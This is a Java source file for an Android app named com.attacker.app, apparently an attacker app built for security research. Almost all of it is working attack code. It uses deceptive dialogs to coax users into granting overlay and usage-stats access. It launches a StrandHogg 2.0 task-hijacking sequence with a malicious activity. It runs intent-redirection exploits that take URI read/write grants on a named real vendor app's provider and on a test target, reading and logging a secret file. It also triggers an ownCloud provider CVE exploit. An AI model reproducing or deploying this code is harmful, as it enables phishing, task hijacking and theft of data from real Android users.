package com.attacker.app;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Process;
import android.provider.Settings;
import android.util.Log;

import com.attacker.app.opencloud.OwncloudProviderExploit;
import com.attacker.app.opencloud.OwncloudProviderExploitActivity;
import com.attacker.app.service.AttackerService;
import com.attacker.app.strandhogg.DistractionActivity;
import com.attacker.app.strandhogg.MaliciousActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Set;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private static final String TAG = MainActivity.class.getSimpleName();
    static final String APP = "com.google.android.googlequicksearchbox";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Dangerous Permissions Request
        requestDangerousPermissions();

        // Settings Permissions Request
        requestSettingsPermission();

        //Create Notification Channel
        createNotificationChannel();

        // Exploit Insecure app's exposed DB (TempAccessDatabase)
        if(BuildConfig.INSECURE_TARGET_GRANT_URI_PERMISSIONS_EXPLOIT){
            exploitTempAccessDb();
        }
        if(BuildConfig.INTENT_REDIRECTION_EXPLOIT_EXPLORATION){
            exploitIntentRedirection();
        }

        // Exploit OpenCloud CVE
        if(BuildConfig.OPENCLOUD_FILELIST_EXPLOIT){
            try {
                String result = OwncloudProviderExploit.exploit(this, "fileName", "filelist");
                Log.i(TAG, "OwncloudProvider Exploit Result: " + result);
            } catch (Exception e) {
                Log.e(TAG, "Error executing Owncloud FileList exploit", e);
            }
        }
        if(BuildConfig.OPENCLOUD_FILELIST_EXPLOUT_POC){
            startActivity(new Intent(this, OwncloudProviderExploitActivity.class));
        }

    }

    @Override
    protected void onResume() {
        super.onResume();

        // Run setup after users has accepted settings permissions
        if(checkUsageStatsPermission() && checkOverLayPermission()){
            attackerSetup();
        }

    }

    /**
     * Utilizes ActivityCompact to generate dialog boxes for users to approve/reject dangerous permissions
     */
    private void requestDangerousPermissions() {
        // Get the list of dangerous permissions
        List<String> permissions = new ArrayList<>();
        try {
            PackageInfo packageInfo = getPackageManager().getPackageInfo(
                    getPackageName(), PackageManager.GET_PERMISSIONS);
            if (packageInfo.requestedPermissions != null) {
                permissions.addAll(Arrays.asList(packageInfo.requestedPermissions));
                Log.d(TAG,"Dangerous permissions: " + permissions);
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }

        // Request all dangerous permissions
        String[] permissionsArray = permissions.toArray(new String[0]);
        ActivityCompat.requestPermissions(this, permissionsArray, PERMISSION_REQUEST_CODE);
    }

    /**
     * Requests for permissions that is approved via Settings
     */
    private void requestSettingsPermission(){

        if (!checkOverLayPermission()) {
            requestOverLayPermission();
        }
        // If Usage stats Permission not granted
        if(!checkUsageStatsPermission()){
            requestUsageStatsPermission();
        }
    }

    /**
     * Checks whether usage stats permission is granted.
     */
    private boolean checkUsageStatsPermission() {
        boolean granted;

        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), getPackageName());

        // Checks whether usage stats permission is granted
        if (mode == AppOpsManager.MODE_DEFAULT)
            granted = (checkCallingOrSelfPermission(Manifest.permission.PACKAGE_USAGE_STATS) == PackageManager.PERMISSION_GRANTED);
        else
            granted = (mode == AppOpsManager.MODE_ALLOWED);

        return granted;
    }

    /**
     * Check if OverLay permission is on
     */
    private boolean checkOverLayPermission() {
        return Settings.canDrawOverlays(getApplicationContext());
    }

    /**
     * Request Overlay permission (via settings)
     */
    private void requestOverLayPermission() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Overlay permission not granted");
        builder.setMessage("Please grant this permission for this app to function properly.");

        builder.setPositiveButton("Go to settings", (dialog, which) -> {
            // Re-direct user to settings page overlay permission page.
            startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName()));
        });

        builder.setNegativeButton("Cancel", (dialog, which) -> finish());

        AlertDialog dialog = builder.create();
        dialog.show();
    }

    /**
     * Request Usage Stats permission (via settings)
     */
    private void requestUsageStatsPermission(){
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Usage Data Access Not Granted");
        builder.setMessage("Please grant this permission for app to function properly");

        builder.setPositiveButton("Goto Settings", (dialogInterface, i) -> {
            //Redirect user to settings page to grant usage stats permission
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName()));
        });

        builder.setNegativeButton("Cancel", (dialogInterface, i) -> finish());

        AlertDialog dialog = builder.create();
        dialog.show();
    }

    /**
     * Starts sticky service and transitions to attacker dashboard
     */
    private void attackerSetup(){
        Log.i(TAG, "All permissions accepted, starting attacker setup.");
        // Start Monitoring Service
        Class<AttackerService> serv = AttackerService.class;

        if (BuildConfig.ENABLE_ATTACKER_SERVICE && !isMyServiceRunning(serv)) {
            startService(new Intent(this, AttackerService.class));
        }

        // Attack only works for Android 9 and below
        if(BuildConfig.STRANDHOGG_TWO_ATTACK){
            Intent intent1 = new Intent();
            Intent intent2 = new Intent();
            Intent intent3 = new Intent();

            // Intent 1: The first victim activity, add FLAG_ACTIVITY_NEW_TASK flag
            intent1.setClassName(BuildConfig.TARGET_PACKAGE_NAME, BuildConfig.TARGET_ACTIVITY);
            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            //  Intent 2: An attacker activity for the first victim activity, no extra flag
            intent2.setClass(this, MaliciousActivity.class);

            // Intent 3: The activity with some normal features, add FLAG_ACTIVITY_NEW_TASK flag
            intent3.setClass(this, DistractionActivity.class);
            intent3.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            Intent[] intents = new Intent[]{
                    intent1, intent2, intent3
            };
            startActivities(intents);
        }

        // Close Main Activity
        if(BuildConfig.CLOSE_APP){
            finish();
        }

        else{
            Log.d(TAG,"Transitioning to Attacker Dashboard");
            // TODO: Create a dashboard that displays information of all installed packages
        }

    }

    /**
     * Checks whether an app service is running. (Limited to services run by app)
     * @param serviceClass To check if a service run by app is running
     * @return boolean result whether target app service is running
     */
    @SuppressWarnings({"deprecation", "BooleanMethodIsAlwaysInverted"})
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);

        // getRunningServices is deprecated. However, still able to obtain own services.
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    /**
     * Creates default Notification Channel
     */
    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        CharSequence name = getString(R.string.notification_channel_name);
        String description = getString(R.string.notification_channel_desc);
        int importance = NotificationManager.IMPORTANCE_HIGH;

        NotificationChannel channel = new NotificationChannel(getString(R.string.notification_channel_id), name, importance);
        channel.setDescription(description);

        // Register the channel with the system; you can't change the importance
        // or other notification behaviors after this
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        notificationManager.createNotificationChannel(channel);
    }

    public void exploitIntentRedirection(){
        // Make modifications here
        Uri targetCp = Uri.parse("content://com.ahnlab.v3mobileenterprise.provider/test.txt");
        String targetPackage = "com.ahnlab.v3mobileenterprise";
        String targetClass = "com.ahnlab.v3mobileenterprise.main.LauncherActivity";

        Intent exploit = new Intent();
        exploit.setData(targetCp);
//        exploit.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        exploit.setFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
        exploit.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        exploit.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        exploit.setClassName(targetPackage, targetClass);
        startActivityForResult(exploit, 0);
    }

    /**
     * Exploit Insecure Target App's Temp Access DB via intent redirection attack.
     */
    public void exploitTempAccessDb(){
        Intent i1 = new Intent();
        i1.setData(Uri.parse("content://sg.insecure.target.data.provider.tempaccess/secret_data.txt"));
        i1.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i1.setClassName("sg.insecure.insecuretarget", "sg.insecure.insecuretarget.MainActivity");
        startActivityForResult(i1, 0);
    }

    /**
     * Android Native onActivityResult method
     * @param requestCode The integer request code originally supplied to
     *                    startActivityForResult(), allowing you to identify who this
     *                    result came from.
     * @param resultCode The integer result code returned by the child activity
     *                   through its setResult().
     * @param data An Intent, which can return result data to the caller
     *               (various data can be attached to Intent "extras").
     *
     */
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if(BuildConfig.INTENT_REDIRECTION_EXPLOIT_EXPLORATION){
            // Check if the result data is not null
            if (data != null) {
                // Log the requestCode and resultCode to see which activity returned the result
                Log.d(TAG, "RequestCode: " + requestCode);
                Log.d(TAG, "ResultCode: " + resultCode);

                // Log the entire Intent (this may be verbose)
                Log.d(TAG, "Intent Data: " + data.toString());

                // Iterate through all the extras in the Intent (if any) and print them
                if (data.getExtras() != null) {
                    Set<String> keys = data.getExtras().keySet();
                    for (String key : keys) {
                        Object value = data.getExtras().get(key);
                        Log.d(TAG, "Extra: " + key + " = " + value);
                    }
                }

                // Optionally, print specific data (e.g., if it's a Uri or some other type of data)
                Uri uri = data.getData();
                if (uri != null) {
                    Log.d(TAG, "Received Uri: " + uri.toString());
                }
            } else {
                Log.d(TAG, "No data received from activity.");
            }
        }

        if (BuildConfig.INSECURE_TARGET_GRANT_URI_PERMISSIONS_EXPLOIT){
            try (InputStream inputStream = getContentResolver().openInputStream(data.getData());
                 BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {

                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    stringBuilder.append(line).append("\n");
                }
                Log.d(TAG, "secret_data.txt content: " + stringBuilder.toString());
            } catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }
    }

}